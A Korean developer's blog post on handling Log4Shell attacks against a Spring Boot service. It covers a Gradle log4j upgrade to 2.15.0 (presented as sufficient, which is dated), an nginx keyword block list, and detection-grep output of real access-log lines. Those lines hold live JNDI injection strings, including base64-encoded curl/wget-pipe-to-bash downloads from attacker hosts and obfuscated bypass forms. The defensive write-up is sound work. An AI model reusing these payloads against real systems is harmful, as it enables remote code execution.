{"componentChunkName":"component---src-templates-blog-post-js","path":"/spring_spring-boot/211214_springboot-log4j-hack/","result":{"data":{"site":{"siteMetadata":{"title":"MHLab blog","author":"MHLab","siteUrl":"https://elfinlas.github.io","comment":{"disqusShortName":"","utterances":"elfinlas/blog_utterances"},"sponsor":{"buyMeACoffeeId":""}}},"markdownRemark":{"id":"d89da246-6715-5ccd-98e4-4c931200339f","excerpt":"요새 시끄러운 log4j2 공격… 요새 Log4J2 취약점 때문에 난리다. 사실 이 이슈가 알려진건 좀 되었다. (물론 일주일 전에 오픈된거로 알고 있긴 하지만…) 보안쪽은 이런 큰 문제가 터지면 바로 대응해야 한다. 조금만 늦게 대응하는 순간 비트코인 마냥 추락하는 거대한 손실을 껴안을 수 있다. 개발쪽은 역시 부지런해야 살아남는듯… 사설이 길었다. 이번 이슈에 대해서는 많은 사람이 적었기에 따로 언급은 안하겠다. 정 궁금하신 분은 이곳 KISA…","html":"<h2 id=\"요새-시끄러운-log4j2-공격\" style=\"position:relative;\"><a href=\"#%EC%9A%94%EC%83%88-%EC%8B%9C%EB%81%84%EB%9F%AC%EC%9A%B4-log4j2-%EA%B3%B5%EA%B2%A9\" aria-label=\"요새 시끄러운 log4j2 공격 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>요새 시끄러운 log4j2 공격…</h2>\n<p>요새 Log4J2 취약점 때문에 난리다.<br>\n사실 이 이슈가 알려진건 좀 되었다. (물론 일주일 전에 오픈된거로 알고 있긴 하지만…)<br>\n보안쪽은 이런 큰 문제가 터지면 바로 대응해야 한다.<br>\n조금만 늦게 대응하는 순간 비트코인 마냥 추락하는 거대한 손실을 껴안을 수 있다.<br>\n개발쪽은 역시 부지런해야 살아남는듯…</p>\n<p>사설이 길었다.<br>\n이번 이슈에 대해서는 많은 사람이 적었기에 따로 언급은 안하겠다.<br>\n정 궁금하신 분은 <strong><a href=\"https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389\">이곳 KISA</a></strong> 에서 확인해보기 바란다.</p>\n<p>나는 현재 개인적으로 돌리는 서비스가 있는데 Spring boot 기반으로 되어 있다.<br>\n저 이슈보자마자 바로 문제가 생기겠구나 싶어서 확인했다.<br>\n처리는 금방 했는데 블로그에는 좀 늦게 올리게 되었다.</p>\n<br>\n<h2 id=\"어떻게-공격이-들어오는가\" style=\"position:relative;\"><a href=\"#%EC%96%B4%EB%96%BB%EA%B2%8C-%EA%B3%B5%EA%B2%A9%EC%9D%B4-%EB%93%A4%EC%96%B4%EC%98%A4%EB%8A%94%EA%B0%80\" aria-label=\"어떻게 공격이 들어오는가 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>어떻게 공격이 들어오는가?</h2>\n<p>일단 불법적으로 들어오는 것들을 조사하는 로그 서버에서 이런 결과가 들어있었다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/769b261384b168f466560382be26ccd4/14a3e/img_01.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 1.6666666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsTAAALEwEAmpwYAAAARElEQVQI1x2IwQ2AMAzEGCmKRJ80uYTSgth/nEPkYVn2dq2HyEGPZDfQPKoNwaMbc0w6koizfnfU+5n3y701ighVtfwBiwIi+pWP7aMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/769b261384b168f466560382be26ccd4/77434/img_01.webp 300w,\n/static/769b261384b168f466560382be26ccd4/411c4/img_01.webp 600w,\n/static/769b261384b168f466560382be26ccd4/cbd37/img_01.webp 1200w,\n/static/769b261384b168f466560382be26ccd4/b3358/img_01.webp 1301w\"\n              sizes=\"(max-width: 1200px) 100vw, 1200px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/769b261384b168f466560382be26ccd4/a8a0d/img_01.png 300w,\n/static/769b261384b168f466560382be26ccd4/dface/img_01.png 600w,\n/static/769b261384b168f466560382be26ccd4/64756/img_01.png 1200w,\n/static/769b261384b168f466560382be26ccd4/14a3e/img_01.png 1301w\"\n            sizes=\"(max-width: 1200px) 100vw, 1200px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/769b261384b168f466560382be26ccd4/64756/img_01.png\"\n            alt=\"img 01\"\n            title=\"img 01\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span>\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/aec2f20ca53fea94b29439398a0b85e9/b5cb9/img_02.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 1.6666666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAPklEQVQI1zWKyQ3AMAzDupKN5unb3X8kJU2QFyFSj6jBo+DZm2IOi0RU42+iZ+vy1+1vFmIx+8M7BogIzIwJcMoilUBNeHUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/aec2f20ca53fea94b29439398a0b85e9/77434/img_02.webp 300w,\n/static/aec2f20ca53fea94b29439398a0b85e9/411c4/img_02.webp 600w,\n/static/aec2f20ca53fea94b29439398a0b85e9/cbd37/img_02.webp 1200w,\n/static/aec2f20ca53fea94b29439398a0b85e9/aa71c/img_02.webp 1532w\"\n              sizes=\"(max-width: 1200px) 100vw, 1200px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/aec2f20ca53fea94b29439398a0b85e9/a8a0d/img_02.png 300w,\n/static/aec2f20ca53fea94b29439398a0b85e9/dface/img_02.png 600w,\n/static/aec2f20ca53fea94b29439398a0b85e9/64756/img_02.png 1200w,\n/static/aec2f20ca53fea94b29439398a0b85e9/b5cb9/img_02.png 1532w\"\n            sizes=\"(max-width: 1200px) 100vw, 1200px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/aec2f20ca53fea94b29439398a0b85e9/64756/img_02.png\"\n            alt=\"img 02\"\n            title=\"img 02\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>동작 방식은 사실 대충 알고, 자세하게 동작하는 방식은 <strong><a href=\"https://www.popit.kr/log4j-%EB%B3%B4%EC%95%88-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%8F%99%EC%9E%91%EC%9B%90%EB%A6%AC-%EB%B0%8F-jenkins-%EC%84%9C%EB%B2%84-%ED%99%95%EC%9D%B8-%EB%B0%A9%EB%B2%95/\">popit</a></strong> 게시글을 참고하자.<br>\n(여담인데 난 원리까진 모르고 어떻게만 공격해서 들어오는지 까지만 알기에… 공격 기법이나 원리에 대한 설명은 무지해서 적을 수 없다…)</p>\n<p>내가 이해한 바로는 log.info 나 log.warn() 등을 통해 로깅을 할 때 메세지에 다음과 같이 적을 때 발생한다.</p>\n<blockquote>\n<p>log.error(“Req Access UA : ” + req.getHeader(“X-Api-Version”) );</p>\n</blockquote>\n<p>위는 예시이다.<br>\n저런식으로 로그를 남기게 해서 공격자의 코드를 수행할 수 있게 한다는거 같다</p>\n<blockquote>\n<p>jandi:ldap://공격자-ip/http443path</p>\n</blockquote>\n<p>위 사진을 보면 알겠지만 저렇게 ldap 뒤에 공격자의 주소를 넣어서 처리하는 식으로 들어온다.</p>\n<br>\n<h2 id=\"그래서-어떻게-처리했는가\" style=\"position:relative;\"><a href=\"#%EA%B7%B8%EB%9E%98%EC%84%9C-%EC%96%B4%EB%96%BB%EA%B2%8C-%EC%B2%98%EB%A6%AC%ED%96%88%EB%8A%94%EA%B0%80\" aria-label=\"그래서 어떻게 처리했는가 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>그래서 어떻게 처리했는가?</h2>\n<p>뭐 별거 없다.<br>\n그냥 log4j 버전업을 했다.<br>\n사진을 못찍었는데 나의 경우 spring boot starter 의 logging 이었나 이게 2.11 버전을 쓰고 있었다.</p>\n<p>그래서 그냥 버전을 올렸다.<br>\n<strong>Gradle</strong> 을 사용하는데 아래와 같이 한줄 넣어줬다.</p>\n<div class=\"gatsby-highlight\" data-language=\"gradle\"><pre class=\"language-gradle\"><code class=\"language-gradle\"><span class=\"token punctuation\">...</span>\next<span class=\"token punctuation\">[</span><span class=\"token string\">'log4j2.version'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'2.15.0'</span>\n\n<span class=\"token keyword\">dependencies</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token punctuation\">....</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">....</span></code></pre></div>\n<p>위와 같이 한줄 넣고 gradle을 새로 받아오니 log4j의 버전이 2.15로 되었다.<br>\n이렇게 대응이 완료되었다… ㅡ,.ㅡ;;</p>\n<p>그리고…이건 공격 대응이 될지 모르겠지만…<br>\nnginx 앞단에서 특정 키워드로 접근하는 것을 막는 부분에 다음과 같이 추가해줬다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">...\n\t~*(j_spring_security_check|wps|cgi|asmx|jndi|dns|securityscan|ldap) 1;\n...</code></pre></div>\n<p>이렇게 하면 서비스 접근 전에 nginx에서 컷 시킬수 있지 않을까 싶다. (안될수도?)<br>\n근데 이렇게 하니 로그 서버에 저런 비 정상적인 접근은 더 이상 들어오지 않았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 563px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/4225f2521cd918169f91b37e67f46deb/e80ce/img_03.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAfUlEQVQI132OSw7CMAxEeyPyEyWhTRwnLXD/Aw22N0gIsZiFx+PnWfbaEEKA9/6HAra9gucJ4gHqw/wYI+b5RG0d1/UG55zoYrvlP9B/gAJrIj1WIPHEOB4CfgmYLGdAHTSg0G+prw95HAakzuanlKxhzgWrNCz3DbkU270BnlljPbEqmJAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4225f2521cd918169f91b37e67f46deb/77434/img_03.webp 300w,\n/static/4225f2521cd918169f91b37e67f46deb/1b3b6/img_03.webp 563w\"\n              sizes=\"(max-width: 563px) 100vw, 563px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4225f2521cd918169f91b37e67f46deb/a8a0d/img_03.png 300w,\n/static/4225f2521cd918169f91b37e67f46deb/e80ce/img_03.png 563w\"\n            sizes=\"(max-width: 563px) 100vw, 563px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4225f2521cd918169f91b37e67f46deb/e80ce/img_03.png\"\n            alt=\"img 03\"\n            title=\"img 03\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>단지 위와 같이 무지성으로 대입해서 들어오는 것들이 많을 뿐…</p>\n<p>그리고 하단의 참고 항목을 보면 Cisco talos 차단 권고 항목에 ip가 있다.<br>\n여기에 등록된 ip 전부 밴 처리 해뒀다.</p>\n<br>\n<h2 id=\"정리-및-참고-그리고-부록\" style=\"position:relative;\"><a href=\"#%EC%A0%95%EB%A6%AC-%EB%B0%8F-%EC%B0%B8%EA%B3%A0-%EA%B7%B8%EB%A6%AC%EA%B3%A0-%EB%B6%80%EB%A1%9D\" aria-label=\"정리 및 참고 그리고 부록 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>정리 및 참고 그리고 부록…</h2>\n<h3 id=\"정리\" style=\"position:relative;\"><a href=\"#%EC%A0%95%EB%A6%AC\" aria-label=\"정리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>정리</h3>\n<p>근데 개인적인 생각인데 User Agent 를 로깅 안하면 영향은 없지 않을까? (개인적 무지성 판단…)<br>\n얼른 대응해서 큰 피해 안나게 조심하자…</p>\n<br>\n<h3 id=\"참고\" style=\"position:relative;\"><a href=\"#%EC%B0%B8%EA%B3%A0\" aria-label=\"참고 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>참고</h3>\n<p><a href=\"https://labrador.iotcube.com\">래브라도 취약점 점검 도구-한글</a><br>\n<a href=\"https://blog.lgcns.com/2740\">LG CNS의 차단 대응 및 안내 -한글</a><br>\n<a href=\"https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot\">Spring 공식 레퍼런스 대응 -영문</a><br>\n<a href=\"https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b\">Log4J 악용탐지-영문</a><br>\n<a href=\"https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html\">Cisco talos 차단 권고-영문</a></p>\n<br>\n \n### 부록 - 악용탐지\n<p>위의 참고 중에 악용 탐지 gist 항목을 보면…<br>\n<strong>/var/log 폴더 및 모든 하위 폴더의 압축되지 않은 파일에서 악용 시도</strong> 에 대한 검색을 할 수 있는 grep 명령어를 제공한다.</p>\n<p>한번 돌려봤다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">fuck-hack@ip-999-444-999-444:~$ sudo egrep -I -i -r '\\$(\\{|%7B)jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):/[^\\n]+' /var/log\n/var/log/nginx/access.log.1:51.89.237.81 - - [13/Dec/2021:04:28:09 +0900] \"GET /$%7Bjndi:ldap://79.172.214.11:1389/Basic/Command/Base64/Y3VybCAxMzUuMTI1LjIxNy44Ny9qbmRpLnNoIHwgYmFzaA==%7D HTTP/1.0\" 404 162 \"-\" \"mozila\"\n/var/log/nginx/access.log.1:45.83.67.182 - - [13/Dec/2021:12:37:28 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-http80%7D HTTP/1.1\" 404 134 \"${jndi:dns://45.83.64.1/securityscan-http80}\" \"${jndi:dns://45.83.64.1/securityscan-http80}\"\n/var/log/nginx/access.log.1:45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D HTTP/1.1\" 302 0 \"${jndi:dns://45.83.64.1/securityscan-https443}\" \"${jndi:dns://45.83.64.1/securityscan-https443}\"\n/var/log/nginx/access.log.1:45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET / HTTP/1.1\" 200 7587 \"${jndi:dns://45.83.64.1/securityscan-https443}\" \"${jndi:dns://45.83.64.1/securityscan-https443}\"\n/var/log/nginx/access.log.1:195.54.160.149 - - [13/Dec/2021:13:45:17 +0900] \"GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo} HTTP/1.1\" 200 396 \"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\" \"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\"\n/var/log/nginx/access.log.1:167.172.44.255 - - [13/Dec/2021:20:45:05 +0900] \"GET / HTTP/1.0\" 200 612 \"-\" \"borchuk/3.1 ${jndi:ldap://167.172.44.255:389/LegitimateJavaClass}\"\n\n=====\n\nfuck-hack@ip-999-444-999-444:~$ sudo find /var/log -name \\*.gz -print0 | xargs -0 zgrep -E -i '\\$(\\{|%7B)jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):/[^\\n]+'\n/var/log/nginx/access.log.3.gz:45.155.205.233 - - [11/Dec/2021:03:21:49 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDQ1LjE1NS4yMDUuMjMzOjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\"\n/var/log/nginx/access.log.3.gz:1.116.59.211 - - [11/Dec/2021:19:13:15 +0900] \"GET /${jndi:ldap://45.130.229.168:1389/Exploit} HTTP/1.1\" 404 162 \"-\" \"curl/7.58.0\"\n/var/log/nginx/access.log.3.gz:195.251.41.139 - - [11/Dec/2021:21:13:15 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"/${jndi:ldap://45.130.229.168:1389/Exploit}\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:02:26:12 +0900] \"GET / HTTP/1.1\" 200 7417 \"-\" \"${jndi:ldap://http443useragent.kryptoslogic-cve-2021-44228.com/http443useragent}\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:04:03:54 +0900] \"GET /$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D HTTP/1.1\" 302 0 \"-\" \"Kryptos Logic Telltale\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:04:03:54 +0900] \"GET / HTTP/1.1\" 200 7418 \"https://3.36.159.204/$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D\" \"Kryptos Logic Telltale\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:08:26:47 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"${jndi:ldap://http80useragent.kryptoslogic-cve-2021-44228.com/http80useragent}\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:09:42:21 +0900] \"GET /$%7Bjndi:ldap://http80path.kryptoslogic-cve-2021-44228.com/http80path%7D HTTP/1.1\" 404 134 \"-\" \"Kryptos Logic Telltale\"\n/var/log/nginx/access.log.2.gz:45.155.204.20 - - [12/Dec/2021:10:01:33 +0900] \"GET /?x=${jndi:ldap://${hostName}.c6qjl3i5aulm7bb8ice0cg4wu5eyyek46.interactsh.com/a} HTTP/1.1\" 400 800 \"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6qjl3i5aulm7bb8ice0cg4wu5eyyek46.interactsh.com}\" \"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6qjl3i5aulm7bb8ice0cg4wu5eyyek46.interactsh.com}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:02:36:55 +0900] \"POST /?&amp;token=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;sign=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;username=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;password=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;error=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;apikey=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;key=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 405 0 \"-\" \"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:12 +0900] \"POST /api?&amp;token=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;sign=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;username=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;password=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;error=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;apikey=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;key=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 302 0 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:12 +0900] \"GET / HTTP/1.1\" 200 7637 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:12 +0900] \"GET /api?&amp;token=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;sign=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;username=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;password=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;error=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;apikey=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;key=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 302 0 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:13 +0900] \"GET / HTTP/1.1\" 200 7635 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:13 +0900] \"PUT /api?&amp;token=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;sign=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;username=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;password=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;error=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;apikey=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;key=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 302 0 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:13 +0900] \"GET / HTTP/1.1\" 200 7635 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:45.155.205.233 - - [10/Dec/2021:22:31:20 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDQ1LjE1NS4yMDUuMjMzOjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\"\n/var/log/nginx/access.log.4.gz:45.155.205.233 - - [10/Dec/2021:23:27:05 +0900] \"GET / HTTP/1.1\" 200 7669 \"-\" 